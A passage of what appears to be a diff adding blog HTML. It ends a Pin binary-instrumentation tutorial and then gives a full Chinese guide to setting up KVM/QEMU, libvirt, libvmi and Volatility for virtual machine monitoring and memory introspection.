================ */</span></div><div class="line"><span class="comment">/*   argc, argv are the entire command line: pin -t      &lt;toolname&gt; -- ...    */</span></div><div class="line"><span class="comment">/* =====================================================     ================ */</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">   <span class="comment">// Initialize pin</span></div><div class="line">   <span class="keyword">if</span> (PIN_Init(argc, argv)) <span class="keyword">return</span> Usage();</div><div class="line"></div><div class="line">   OutFile.open(KnobOutputFile.Value().c_str());</div><div class="line"></div><div class="line">  <span class="comment">// Register Instruction to be called to instrument      instructions</span></div><div class="line">    INS_AddInstrumentFunction(Instruction, <span class="number">0</span>);</div><div class="line"></div><div class="line">   <span class="comment">// Register Fini to be called when the application      exits</span></div><div class="line">    PIN_AddFiniFunction(Fini, <span class="number">0</span>);</div><div class="line"></div><div class="line">    <span class="comment">// Start the program, never returns</span></div><div class="line">    PIN_StartProgram();</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.cs.virginia.edu/kim/docs/pldi05.pdf" target="_blank" rel="external">PLDI’2005</a></p>
+<p><a href="https://software.intel.com/sites/landingpage/pintool/docs/65163/Pin/html/" target="_blank" rel="external">PIN User Manual</a></p>
+<p><a href="https://software.intel.com/en-us/articles/pin-a-dynamic-binary-instrumentation-tool" target="_blank" rel="external">PIN Intel Tutorials</a></p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/pinintro/" target="_blank" rel="external">二进制代码注入PIN</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+
+      
+    </div>
+    
+    
+      <footer class="article-footer">
+        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Binary/">Binary</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Instrumentation/">Instrumentation</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PIN/">PIN</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li></ul>
+
+      </footer>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+    
+      <article id="post-virtualizationcomprehensive" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/01/02/virtualizationcomprehensive/">虚拟机环境搭建、管理、监控与分析</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      <a href="/2017/01/02/virtualizationcomprehensive/" class="article-date">
+  <time datetime="2017-01-02T08:23:01.000Z" itemprop="datePublished">2017-01-02</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/虚拟化综合/">虚拟化综合</a>
+  </div>
+
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<p><strong>CSysSec注</strong>： 本文来自<a href="http://www.chongh.wiki/about/" target="_blank" rel="external">Diting0x</a>的<a href="http://www.chongh.wiki/blog/2016/03/31/virt-setup-analysis/" target="_blank" rel="external">个人博客</a>，从虚拟机的环境搭建、管理、监控到分析，介绍的内容非常全面，值得推荐。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/virtualizationcomprehensive/" target="_blank" rel="external">虚拟机环境搭建、管理、监控与分析</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<blockquote>
+<ul>
+<li>0x01 全文环境 </li>
+<li>0x02 虚拟机创建KVM/QEMU </li>
+<li>0x03 虚拟机管理Libvirt</li>
+<li>0x04 虚拟机监控Libvmi</li>
+<li>0x05 虚拟机监控Volatility</li>
+</ul>
+</blockquote>
+<p>本文介绍了一套完整的虚拟化环境搭建与分析工作，包括虚拟机的创建，虚拟机的管理，以及虚拟机的监控与分析。可根据自身需要阅读相关内容。</p>
+<hr>
+<h3 id="0x01-全文环境"><a href="#0x01-全文环境" class="headerlink" title="0x01 全文环境"></a>0x01 全文环境</h3><p>Ubuntu12.04 + Kvm-kmod-3.8 + Qemu-kvm-1.1.2+ Libvirt 1.3.2 + Libvmi + Volatility </p>
+<h3 id="Ox02-虚拟机创建KVM-QEMU"><a href="#Ox02-虚拟机创建KVM-QEMU" class="headerlink" title="Ox02 虚拟机创建KVM/QEMU"></a>Ox02 虚拟机创建KVM/QEMU</h3><p>Kvm需要CPU的支持（Intel VT 或者 AMD SVM)，在安装KVM之前，可先检查CPU是否支持硬件虚拟化技术。基于Intel的系统，可运行 ‘grep vmx /proc/cpuinfo’ 查看是否含有vmx的关键字，如果有，则表示支持；基于AMD的系统，可运行 ‘grep svm /proc/cpuinfo’ 查看是否含有svm的关键字。<br>另外，CPU若支持硬件虚拟化，还得确保BLOS开启了VT选项（有些厂商默认是禁用的，如thinkpad t450). 可以下载 cpu-checker 工具（apt-get install cpu-checker)，之后运行kvm-ok， 如果提示 kvm acceleration can not be used，则可能是blos禁用了kvm虚拟化，在blos设置中开启即可。</p>
+<p>可执行：</p>
+<pre><code>modprobe kvm 
+modprobe kvm_intel 
+</code></pre><p>开启内核自带的kvm</p>
+<p>关于源码安装kvm-kmod以及qemu-kvm的详细过程可参考 <a href="http://www.csyssec.org/20170102/kvmqemuintro/" target="_blank" rel="external">上一篇</a> 文章。kvm-kmod安装成功后，运行lsmod | grep kvm， 会显示两个module:</p>
+<pre><code>kvm_intel             137721  3 
+kvm                   415549  1 kvm_intel
+</code></pre><p>qemu-kvm安装成功后会在/your-confiure-location/bin/qemu-system-x86_64等可执行文件。</p>
+<p>安装完KVM/QEMU后，创建虚拟机的时候，虚拟机的网络方式是比较关心的问题，KVM/QEMU有两种网络配置方式。</p>
+<p>其一，用户模式（User Networking): 即NAT方式，也是默认的网络模式。让虚拟机访问主机、互联网或本地网络上的资源的简单方法，但是不能从网络或其他的客户机访问客户机。既然无法访问客户机，那宿主机与客户机该如何传输文件呢？默认的，客户机得到的ip空间为10.0.2.0/24，宿主机提供了ip为10.0.2.2的地址让虚拟机访问。可以ssh到宿主机(10.0.2.2)，用scp来拷贝文件。</p>
+<p>其二，桥接模式（Bridge Networking): 这种模式允许客户机就像一台独立的主机一样拥有网络。这种方式要比用户网络复杂一些，但是设置好后客户机与互联网，客户机与主机之间的通信都很容易。桥接网络需要网卡支持，一般的有线网卡都支持，绝大部分的无线网卡都不支持。</p>
+<p>NAT方式是KVM/QEMU提供的默认方式，要设置桥接模式，首先在宿主机上安装桥接相关的包，</p>
+<pre><code>apt-get install bridge-utils. 
+</code></pre><p>修改/etc/network/interfaces</p>
+<pre><code>auto lo
+iface lo inet loopback
+auto eth0
+iface eth0 inet manual
+auto br0
+iface br0 inet dhcp
+   bridge_ports eth0
+   bridge_stp off
+   bridge_fd 9
+   bridge_hello 2
+   bridge_maxwait 0
+</code></pre><p>执行</p>
+<pre><code>/etc/init.d/networking restart
+</code></pre><p>配置好后，可运行brctl-show命令，会显示：</p>
+<pre><code>bridge name      bridge id              STP enabled interfaces
+br0              8000.68f728eddb0d      no          eth0
+                                              vnet0
+</code></pre><p>之后在创建虚拟机的时候可添加-net nic -net tap参数，如</p>
+<pre><code>/usr/local/bin/qemu-system-x86_64 -hda imgname.img -vnc :1 -m 1024 -net nic -net tap -monitor stdio    
+</code></pre><p>之后创建的虚拟机便工作在网桥模式中。</p>
+<h3 id="0x03-虚拟机管理Libvirt"><a href="#0x03-虚拟机管理Libvirt" class="headerlink" title="0x03 虚拟机管理Libvirt"></a>0x03 虚拟机管理Libvirt</h3><p>除了用qemu命令行的方式创建与管理虚拟机，也可将一些命令行参数保存为xml配置文件，用libvirt来管理。libvirt是一套管理虚拟机的工具，包括管理虚拟机的API、一个守护进程（libvirtd)和一个命令行工具（virsh). Libvirt 的主要目标是提供一个单一途径以管理多种不同虚拟化方案已经虚拟化主机，包括KVM/QEMU,Xen,LXC等。安装libvirt后，会产生libvirtd进程以及virsh工具，要利用libvirt做开发，可调用其中的API。libvirt, libvirtd 以及virsh的关系如下图：</p>
+<p><img src="http://7xppf1.com1.z0.glb.clouddn.com/libvirt-internal.png" alt="libvirt-internal"></p>
+<p>详细介绍可参考：<a href="http://libvirt.org/internals.html" target="_blank" rel="external">libvirt internals</a></p>
+<p>安装libvirt: </p>
+<p>先安装libvirt所依赖的包</p>
+<pre><code>apt-get install libnl-dev libxml2 libxml2-dev  libpciaccess-dev libyajl-dev libdevmapper-dev libgnutls-dev
+</code></pre><p>如出现以下错误，都可以检查上述这些包是否安装好</p>
+<pre><code>error: Could not find libxml2 anywhere
+
+error: You must install the GnuTLS library in order to compile and run libvirt
+
+error: You must install device-mapper-devel/libdevmapper &gt;= 1.0.0 to compile libvirt
+
+error: libnl-devel &gt;= 1.1 is required for macvtap support
+</code></pre><p>下载libvirt1.3.2.tar.gz</p>
+<pre><code>tar xvf libvirt1.3.2.tar.gz
+./configure
+make &amp;&amp; make install
+</code></pre><p>安装完成后，执行ldconfig同步链接库，否则会出现以下错误：</p>
+<pre><code>virsh: error while loading shared libraries: libvirt.so.0: cannot open shared object file: No such file or directory
+</code></pre><p>执行检查libvirt安装成功</p>
+<pre><code>which libvirtd
+libvirtd –version
+which virsh
+virsh –version
+</code></pre><p>若出现此类错误：</p>
+<pre><code>error: Failed to reconnect to the hypervisor
+error: no valid connection
+error: Failed to connect socket to &apos;/usr/local/var/run/libvirt/libvirt-sock&apos;: No such file or directory
+</code></pre><p>则很有可能是libvirtd进程没有开启，这时需要手动开启libvirtd,执行libvirtd -d 即可。(libvirtd具体参数可参考：<a href="http://linux.die.net/man/8/libvirtd" target="_blank" rel="external">libvirtd manual</a> ）</p>
+<p>另外注意，libvirt从1.3版本后增加了virtlogd特性，需要执行virtlogd -d手动开启virtlogd进程（virtlogd具体参数可参看：<a href="https://www.mankier.com/8/virtlogd" target="_blank" rel="external">virtlogd manual</a> ）. 否则会出现以下错误：</p>
+<pre><code>error: Failed to connect socket to &apos;/usr/local/var/run/libvirt/virtlogd-sock&apos;: No such file or directory
+</code></pre><p>安装好libvirt后，便可配置好xml文件，用virsh来管理。具体virsh命令这里不做介绍，可参考其中一个配置文件：</p>
+<pre><code>&lt;domain type=&apos;kvm&apos;&gt;
+&lt;name&gt;ubuntudemo&lt;/name&gt;&lt;!--虚拟机名称--&gt;
+&lt;memory&gt;1048576&lt;/memory&gt;&lt;!--最大内存，单位KB--&gt;
+&lt;currentMemory&gt;1048576&lt;/currentMemory&gt;&lt;!--可用内存，单位k--&gt;
+&lt;uuid&gt;87d5b3d2-3618-4a59-9efb-aa869ff34999&lt;/uuid&gt;
+
+&lt;vcpu&gt;1&lt;/vcpu&gt;&lt;!--虚拟cpu个数--&gt;
+&lt;os&gt;
+    &lt;type arch=&apos;x86_64&apos;,machine=&apos;pc&apos;&gt;hvm&lt;/type&gt;
+    &lt;boot dev=&apos;hd&apos;/&gt;&lt;!--光盘启动--&gt;
+&lt;/os&gt;
+&lt;features&gt;
+    &lt;acpi/&gt;
+    &lt;apic/&gt;
+    &lt;pae/&gt;
+&lt;/features&gt;
+&lt;clock offset=&apos;localtime&apos;/&gt;
+&lt;on_poweroff&gt;destroy&lt;/on_poweroff&gt;
+&lt;on_reboot&gt;restart&lt;/on_reboot&gt;
+&lt;on_crash&gt;destroy&lt;/on_crash&gt;
+&lt;devices&gt;
+    &lt;emulator&gt;/usr/bin/qemu&lt;/emulator&gt; &lt;!--先创建好软链接   ln -s /use/local/qemukvm1.1.2/bin/qemu-system-x86_64 /usr/bin/qemu--&gt;
+    &lt;disk type=&apos;file&apos; device=&apos;disk&apos;&gt;
+        &lt;driver name=&apos;qemu&apos; type=&apos;qcow2&apos;/&gt;
+        &lt;source file=&apos;/home/os.img/server12041.img&apos;/&gt;&lt;!--目的镜像路径--&gt;
+        &lt;target dev=&apos;vda&apos; bus=&apos;virtio&apos;/&gt;
+    &lt;/disk&gt;
+
+    &lt;interface type=&apos;bridge&apos;&gt;&lt;!--虚拟机网络连接方式--&gt;
+        &lt;source bridge=&apos;br0&apos;/&gt;&lt;!--当前主机网桥的名称--&gt;
+        &lt;mac address=&quot;00:16:3e:5d:aa:a8&quot;/&gt;&lt;!--为虚拟机分配mac地址，务必唯一，否则dhcp获得同样ip,引起冲突--&gt;
+    &lt;/interface&gt;
+    &lt;input type=&apos;mouse&apos; bus=&apos;ps2&apos;/&gt;
+    &lt;!--vnc方式登录，端口号自动分配，自动加1，可以通过virsh vncdisplay ubuntudemo来查询（实际端口为显示结果+5900）--&gt; 
+    &lt;graphics type=&apos;vnc&apos; port=&apos;-1&apos; autoport=&apos;yes&apos; listen=&apos;0.0.0.0&apos; keymap=&apos;en-us&apos;/&gt;
+&lt;/devices&gt;
+</code></pre><p></p>
+<h3 id="0x04-虚拟机监控Libvmi"><a href="#0x04-虚拟机监控Libvmi" class="headerlink" title="0x04 虚拟机监控Libvmi"></a>0x04 虚拟机监控Libvmi</h3><p>Libvmi是一套能从底层二进制信息重构虚拟机上层语义的C语言API。由于hypervisor(VMM)获取的全是客户机的二进制比特，用户为了从外部（比如宿主机)监控客户机的行为需要理解客户机上层的语义，比如客户机正在运行的进程列表、模块列表等信息，这种二进制到上层语义之间的gap称之为语义鸿沟（semantic gap)，从外部监控客户机的行为称之为虚拟机自省（VM Introspection）。 Libvmi提供的API，能够读取物理内存、虚拟内存、符号表（System.map）、暂停/打开虚拟机、接收内存与寄存器事件的通知等，让用户能很方便的构建插件，来读取进程列表、模块列表等信息（大部分linux原生监控工具都可以通过libvmi来构建). </p>
+<p>Libvmi目前支持Intel,AMD64以及ARM系统结构，支持的虚拟机平台包括XEN与KVM/QEMU，支持的被监控系统类型包括windows和linux. Libvmi从Xenaccess发展而来，要了解其详细原理，可参考论文<a href="https://www.acsac.org/2007/papers/138.pdf" target="_blank" rel="external">Secure and Flexible Monitoring of Virtual Machines</a>以及官方主页<a href="http://libvmi.com/" target="_blank" rel="external">libvmi</a>.</p>
+<p>安装libvmi:</p>
+<p>先安装其依赖的包，注，这里针对KVM/QEMU，关于XEN依赖的包，会有所不同，可参考<a href="http://libvmi.com/docs/gcode-install.html" target="_blank" rel="external">libvmi-installation</a></p>
+<pre><code>apt-get install automake autoconf
+apt-get install libtool
+apt-get install flex bison
+apt-get install check
+</code></pre><p>下载libvmi-0.10.1.tar.gz</p>
+<pre><code>tar xvf libvmi-0.10.1.tar.gz
+</code></pre><p>安装    </p>
+<pre><code>cd libvmi-0.10.1
+./autogen.sh
+./congfigure
+make 
+make install
+ldconfig
+</code></pre><p>libvmi提供了很多plugin examples在/libvmi/examples文件夹中，<br>要运行其中的plugin（比如process-list，列举客户机中进程信息，类似linux的原生ls命令), 首先要找出客户机符号表中的一些偏移信息. libvmi提供了获取偏移信息的工具在/libvmi/tools/linux-offset-finder/ 文件夹中，将其拷贝到虚拟机中，make编译，生成了一个内核模块findoffset.ko，执行insmod findoffset.ko将其插入内核中，<br> 再执行dmesg 将得到的偏移信息，如：</p>
+<pre><code>ostype = &quot;Linux&quot;;
+//sysmap = &quot;/boot/System.map-3.2.0-29-generic&quot;;
+linux_name = 0x470;
+linux_tasks = 0x248;
+linux_mm=0x280;
+linux_pid=0x2bc;
+linux_pgd=0x58;
+</code></pre><p>写进宿主机的/libvmi/etc/libvmi-example.conf中，将libvmi-example.conf拷贝到/etc/libvmi.conf或者\$HOME/etc/libvmi.conf中,注，这里libvmi会在/etc/libvmi.conf或者\$HOME/etc/libvmi.conf中读取偏移信息。另外，这里的sysmap路径是host主机的路径，需要把guest中的System.map文件拷贝到host主机上。(还发现一个问题，虚拟机的名字不能全以数字命名，比如120432,不然在读取libvmi.conf配置文件时会出错).</p>
+<p>之后运行</p>
+<pre><code>/libvmi/examples/process-list ubuntudemo 
+</code></pre><p>这里ubuntudemo是创建的虚拟机名字。以下是列出的部分信息：</p>
+<pre><code>Process listing for VM ubuntudemo (id=3)
+Next list entry is at: ffff88003d638248
+[    0] swapper/0 (struct addr:ffffffff81c0d020)
+[    1] init (struct addr:ffff88003d638000)
+[    2] kthreadd (struct addr:ffff88003d639700)
+[    3] ksoftirqd/0 (struct addr:ffff88003d63ae00)
+[    6] migration/0 (struct addr:ffff88003d658000)
+[    7] watchdog/0 (struct addr:ffff88003d659700)
+[    8] cpuset (struct addr:ffff88003d65ae00)
+[    9] khelper (struct addr:ffff88003d65c500)
+[   10] kdevtmpfs (struct addr:ffff88003d65dc00)
+[   11] netns (struct addr:ffff88003d698000)
+[   12] sync_supers (struct addr:ffff88003d699700)
+</code></pre><p>Libvmi提供的plugins有限，用户可根据需要编写，也可利用取证工具volatlity做更高层次语义的分析。Libvmi支持python绑定，提供了与volatility绑定的接口，具体可见下文。</p>
+<p>###0x05 虚拟机监控Volatility  </p>
+<p>Volatility是一个用python编写的内存分析工具，与libvmi（利用sysystem.map符号表信息)不同的是，volatility利用可执行文件elf中的调试信息（dwarf格式）以及system.map符号表信息来获取更丰富的变量和函数语义。其支持windows， linux以及mac。 文中以Linux为例。</p>
+<p>Get Started:</p>
+<p>下载volatility包</p>
+<pre><code>git clone https://github.com/volatilityfoundation/volatility.git
+</code></pre><p>创建Linux profile</p>
+<p>profile是个zip文件，包含内核数据结构以及调试信息，也就是dwarf文件（volatility称之为vtypes)与system.map的压缩包。</p>
+<p>volatility提供了一个内核模块在/volatility/tools/linux文件夹下来获取vtypes信息，将文件夹内容拷贝到要分析的客户机中，编译make，生成module.dwarf文件。在此之前请确保客户机中以及安装dwarfdump (apt-get install dwarfdump）。之后执行 head module.dwarf，会显示以下内容:</p>
+<pre><code>.debug_info
+
+&lt;0&gt;&lt;0+11&gt;&lt;DW_TAG_compile_unit&gt; DW_AT_producer&lt;GNU C 4.6.3&gt; DW_AT_language&lt;DW_LANG_C89&gt;.....
+
+&lt;1&gt;&lt;45&gt;&lt;DW_TAG_typedef&gt; DW_AT_name&lt;__s8&gt; DW_AT_decl_file&lt;1 include/asm-generic/int-ll64.h&gt;.....
+</code></pre><p>生成</p>
+<p>接着将module.dwarf文件以及/boot/System.map-3.2.0-99-generic 文件（不同系统文件名不同）压缩成一个zip文件，如Ubuntu1204.zip。执行：</p>
+<pre><code>zip volatility/volatility/plugins/overlays/linux/Ubuntu1204.zip volatility/tools/linux/module.dwarf /boot/System.map-3.2.0-99-generic
+</code></pre><p>使用profile</p>
+<pre><code>python vol.py --info | grep Linux 
+</code></pre><p> 这时会显示之前创建的profile名，Linuxubuntu1204x64.</p>
+<pre><code>LinuxUbuntu1204x64    - A Profile for Linux Ubuntu1204 x64 &lt;=== This is the one we just created
+</code></pre><p>绑定libvmi的python接口</p>
+<p>在./volatility/plugins/addrspaces 有针对不同内存快照的物理地址空间，如vmware.py,lime.py，crash.py等。libvmi则提供了pyvmi接口，在/libvmi/tools/pyvmi文件夹中有个pyvmiaddressspace.py文件可供volatility使用，（若需要自己编写python程序，则需要build pyvmi，build过程可参见其中的README文件，若出现编译错误，请确保安装 apt-get install build-essentials, apt-get install python2.7-dev).<br>将pyvmiaddressspace.py文件拷贝至./volatility/plugins/addrespaces文件夹中便可以利用volatility的plugins来分析虚拟机的内存了。以linux_pslist plugin为例，执行：</p>
+<pre><code>python vol.py -l vmi://ubuntudemo --profile=Linuxubuntu1204x64 linux_pslist  
+</code></pre><p>若出现distorm3（反编译库)相关错误，请确保已经安装distorm3</p>
+<pre><code>apt-get install python-pip
+pip install distorm3
+</code></pre><p>绑定pyvmi接口后，volatility所有的plugins都可以用来分析虚拟机内存。 </p>
+<p>完</p>
+<hr>
+<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="http://libvmi.com/" target="_blank" rel="external">Libvmi</a></p>
+<p><a href="http://libvirt.org/" target="_blank" rel="external">Libvirt</a></p>
+<p><a href="https://github.com/volatilityfoundation/volatility/wiki" target="_blank" rel="external">Volatility wiki</a></p>
+<p><a href="https://www.acsac.org/2007/papers/138.pdf" target="_blank" rel="external">Secure and Flexible Monitoring of Virtual Machines</a></p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/virtualizationcomprehensive/" target="_blank" rel="external">虚拟化环境搭建、管理、监控与分析</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+
+      
+    </div>
+    
+    
+      <footer class="article-footer">
+        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Introspection/">Introspection</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/KVM/">KVM</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Libvmi/">Libvmi</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/QEMU/">QEMU</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Virtualization/">Virtualization</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Volatility/">Volatility</a></li></ul>
+
+      </footer>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
     </section>
     <footer id="footer">
   
